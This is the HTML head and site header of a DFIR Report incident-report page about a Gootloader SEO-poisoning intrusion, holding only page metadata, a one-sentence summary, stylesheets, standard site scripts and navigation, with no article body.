<html lang="en-US" class="jetpack-lazy-images-js-enabled" style="transform: none;"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">

<title>SEO Poisoning - A Gootloader Story</title>
<meta name="description" content="In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity.">
<link rel="canonical" href="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/">
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="SEO Poisoning - A Gootloader Story">
<meta property="og:description" content="In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity.">
<meta property="og:url" content="https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/">
<meta property="og:site_name" content="The DFIR Report">
<meta property="article:published_time" content="2022-05-09T01:53:53+00:00">
<meta property="article:modified_time" content="2022-05-09T02:05:42+00:00">
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2022/05/goot.png">
<meta property="og:image:width" content="1454">
<meta property="og:image:height" content="1054">
<meta property="og:image:type" content="image/png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:label1" content="Written by">
<meta name="twitter:data1" content="editor">
<meta name="twitter:label2" content="Est. reading time">
<meta name="twitter:data2" content="19 minutes">
<script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/nEGwmCAyCoKVn9PSwAGnQWhY/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-ViRSoPeEUan2O4h07x9IksdeF0E7Rmq7CP+gICf/oQ6eU8xvnQ66dg4Pl6wE3xRz"></script><script id="twitter-wjs" src="https://platform.twitter.com/widgets.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://thedfirreport.com/#website","url":"https://thedfirreport.com/","name":"The DFIR Report","description":"Real Intrusions by Real Attackers, The Truth Behind the Intrusion","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://thedfirreport.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","inLanguage":"en-US","@id":"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/#primaryimage","url":"https://thedfirreport.com/wp-content/uploads/2022/05/goot.png","contentUrl":"https://thedfirreport.com/wp-content/uploads/2022/05/goot.png","width":1454,"height":1054},{"@type":"WebPage","@id":"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/#webpage","url":"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/","name":"SEO Poisoning - A Gootloader Story","isPartOf":{"@id":"https://thedfirreport.com/#website"},"primaryImageOfPage":{"@id":"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/#primaryimage"},"datePublished":"2022-05-09T01:53:53+00:00","dateModified":"2022-05-09T02:05:42+00:00","author":{"@id":"https://thedfirreport.com/#/schema/person/b74bd4df805a2739b85903202f6b5838"},"description":"In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access and command and control activity.","breadcrumb":{"@id":"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"]}]},{"@type":"BreadcrumbList","@id":"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://thedfirreport.com/"},{"@type":"ListItem","position":2,"name":"SEO Poisoning &#8211; A Gootloader Story"}]},{"@type":"Person","@id":"https://thedfirreport.com/#/schema/person/b74bd4df805a2739b85903202f6b5838","name":"editor","image":{"@type":"ImageObject","inLanguage":"en-US","@id":"https://thedfirreport.com/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/9627d3871f13290c26ecf861f7715257?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/9627d3871f13290c26ecf861f7715257?s=96&d=mm&r=g","caption":"editor"},"sameAs":["https://thedfirreport.com"],"url":"https://thedfirreport.com/author/editor/"}]}</script>

<link rel="dns-prefetch" href="//cdn.jsdelivr.net">
<link rel="dns-prefetch" href="//www.google.com">
<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="dns-prefetch" href="//s.w.org">
<link rel="alternate" type="application/rss+xml" title="The DFIR Report » Feed" href="https://thedfirreport.com/feed/">
<link rel="alternate" type="application/rss+xml" title="The DFIR Report » Comments Feed" href="https://thedfirreport.com/comments/feed/">
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.9.3"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://thedfirreport.com/wp-includes/css/dist/block-library/style.min.css?ver=5.9.3" type="text/css" media="all">
<style id="wp-block-library-inline-css" type="text/css">
.has-text-align-justify{text-align:justify;}
</style>
<link rel="stylesheet" id="mediaelement-css" href="https://thedfirreport.com/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.16" type="text/css" media="all">
<link rel="stylesheet" id="wp-mediaelement-css" href="https://thedfirreport.com/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=5.9.3" type="text/css" media="all">
<style id="global-styles-inline-css" type="text/css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel="stylesheet" id="contact-form-7-css" href="https://thedfirreport.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.5.6" type="text/css" media="all">
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=5.9.3" type="text/css" media="all">
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/font-awesome.min.css?ver=5.9.3" type="text/css" media="all">
<link rel="stylesheet" id="freenews-google-fonts-css" href="//fonts.googleapis.com/css?family=Heebo:300,400,700|Arimo&amp;subset=latin%2Clatin-ext" type="text/css" media="all">
<link rel="stylesheet" id="social-logos-css" href="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/social-logos/social-logos.min.css?ver=10.9" type="text/css" media="all">
<link rel="stylesheet" id="jetpack_css-css" href="https://thedfirreport.com/wp-content/plugins/jetpack/css/jetpack.css?ver=10.9" type="text/css" media="all">
<script type="text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/related-posts/related-posts.min.js?ver=20211209" id="jetpack_related-posts-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/jquery/jquery.min.js?ver=3.6.0" id="jquery-core-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/"><link rel="alternate" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/6736"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://thedfirreport.com/wp-includes/wlwmanifest.xml">
<meta name="generator" content="WordPress 5.9.3">
<link rel="shortlink" href="https://thedfirreport.com/?p=6736">
<link rel="alternate" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2022%2F05%2F09%2Fseo-poisoning-a-gootloader-story%2F">
<link rel="alternate" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2022%2F05%2F09%2Fseo-poisoning-a-gootloader-story%2F&amp;format=xml">

<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="text/javascript"></script>
<script type="text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=AFAA584284FAB3BEE1A67E8943E68BC3');
</script><style type="text/css">img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>
<style type="text/css">
				/* If html does not have either class, do not show lazy loaded images. */
				html:not( .jetpack-lazy-images-js-enabled ):not( .js ) .jetpack-lazy-image {
					display: none;
				}
			</style>
<script type="text/javascript">
				document.documentElement.classList.add(
					'jetpack-lazy-images-js-enabled'
				);
			</script>
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32">
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png">
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png">
<script src="https://thedfirreport.com/wp-includes/js/wp-emoji-release.min.js?ver=5.9.3" type="text/javascript" defer=""></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><script type="text/javascript" charset="UTF-8" src="https://translate.googleapis.com/_/translate_http/_/js/k=translate_http.tr.lt.lRxITyNY5Rg.O/am=Ag/d=1/exm=el_conf/ed=1/rs=AN8SPfr77VeonYvAEHJ977muntMcxW1xaw/m=el_main"></script><style id="theia-sticky-sidebar-stylesheet-TSS">.theiaStickySidebar:after {content: ""; display: table; clear: both;}</style></head>
<body class="post-template-default single single-post postid-6736 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden" style="transform: none;">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0.49803921568627"></feFuncR><feFuncG type="table" tableValues="0 0.49803921568627"></feFuncG><feFuncB type="table" tableValues="0 0.49803921568627"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 0.27843137254902"></feFuncG><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0"></feFuncR><feFuncG type="table" tableValues="0 0.64705882352941"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.78039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.94901960784314"></feFuncG><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.44705882352941 0.4"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.098039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.66274509803922"></feFuncG><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><div id="page" class="site" style="transform: none;">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
 <div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-3401"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="page_item page-item-24"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
<li class="page_item page-item-2160"><a href="https://thedfirreport.com/services/">Services</a></li>
</ul></div>
</nav>
</div>
</div>
</div>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker-sticky-wrapper" class="sticky-wrapper" style="height: 50px;"><div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<div id="primary-menu" class="menu"><ul aria-expanded="false" class=" nav-menu">
<li class="page_item page-item-3401"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="page_item page-item-24"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
<li class="page_item page-item-2160"><a href="https://thedfirreport.com/services/">Services</a></li>
</ul></div>
</nav>
</div>
</div>
</div>
<div class="clock">
<div id="time">2:16:09 AM</div>
<div id="date">Monday, May 09, 2022</div>
</div>
</div></div>
</div>
</div>
</header>
